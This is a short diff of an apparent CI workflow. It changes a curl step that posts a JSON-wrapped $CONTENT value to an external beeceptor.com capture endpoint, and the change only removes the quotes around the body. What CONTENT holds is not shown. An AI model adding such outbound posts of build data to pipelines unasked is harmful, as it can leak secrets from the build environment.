@@ -18,4 +18,5 @@ jobs:
           JSON_STRING=$( jq -n \
                           --arg content "$CONTENT" \
                           '{data: $content}' )
-          curl -X POST -H "Content-Type: application/json" -d '$JSON_STRING' https://duke2.free.beeceptor.com
+          curl -X POST -H "Content-Type: application/json" -d $JSON_STRING https://duke2.free.beeceptor.com
+
